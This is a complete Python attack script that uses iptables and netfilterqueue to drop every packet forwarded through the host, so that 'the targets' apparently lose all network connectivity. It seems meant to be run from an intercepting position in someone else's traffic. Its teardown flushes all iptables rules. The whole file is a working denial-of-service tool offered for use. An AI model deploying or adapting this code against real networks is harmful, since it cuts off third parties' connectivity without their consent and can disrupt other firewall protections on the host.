#!/usr/bin/env python
import subprocess
import netfilterqueue
class Packet_drop:

    def start_attack(self):
        command = "iptables -I FORWARD -j NFQUEUE --queue-num 0"
        subprocess.call(command,shell=True)

    def end_attack(self):
        command = "iptables --flush"
        subprocess.call(command,shell=True)

    def process_packet(self ,packet):
        packet.drop()

    def run_attack(self):
        self.start_attack()
        try:
            queue = netfilterqueue.NetfilterQueue()
            queue.bind(0,self.process_packet)
            print("[+] The targets are getting all of their packets dropped")
            print("[+] Press Crtl + C whenever you want to stop the process")
            queue.run()
        except KeyboardInterrupt:
            print("\n[+] The process has been interupted successfully")
        self.end_attack()